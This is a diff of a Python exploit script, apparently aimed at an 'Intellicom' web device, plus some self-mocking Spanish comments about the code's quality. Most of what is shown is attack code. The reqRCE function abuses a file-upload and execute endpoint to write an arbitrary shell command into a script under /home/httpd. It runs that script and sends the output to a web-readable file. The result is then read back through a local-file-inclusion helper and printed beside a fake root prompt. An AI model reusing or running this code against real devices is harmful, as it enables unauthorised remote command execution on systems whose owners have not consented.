@@ -67,11 +67,10 @@ def reqRCE(xCookie, xCommand):
 											'script1'	: 'file', 
 											'filename1'	: '/home/httpd/pageimages/cowTeam.sh',
 											'maxsize1'	: '9100', 
-
-											'content1'	: '/bin/'+xCommand+' >'+"/home/httpd/cmdOut.txt", # litle bash script
+											'content1'	: '/bin/'+xCommand+' >'+"/home/httpd/cmdOut.txt", 
 
 											'script2'	: 'execute',
-											'path2'		: 'sh '+'/home/httpd/pageimages/cowTeam.sh'
+											'path2'		: 'sh  /home/httpd/pageimages/cowTeam.sh'
 										})
 	contentType = len(str(thePost))
 
@@ -85,7 +84,7 @@ def reqRCE(xCookie, xCommand):
 	headers["Content-Length"]	=  str(contentType)
 	headers["Content-Type"] 	= thePost.content_type
 
-	r1 = requests.post(fullHost, data=thePost,headers=headers)#,timeout=9915.000)
+	r1 = requests.post(fullHost, data=thePost,headers=headers)
 	return r1.text
 
 testReq = reqRCE(cookie, cmd)
@@ -122,3 +121,11 @@ command = reqLFI(HST)#,port)
 
 print Colors.GREEN+"\n [+] "+Colors.BLUE+"root@intellicom:~#> "+Colors.RED+cmd+Colors.BLUE+"_\n"
 print Colors.ORANGE+command+Colors.DEFAULT
+
+
+
+
+# Que asco de codigo. Ahorrar codigo donde ? xd
+# Prometo en un proximo update hacer el codigo mas feo aun. Y tal vez hasta funcione.
+
+# Los quiero
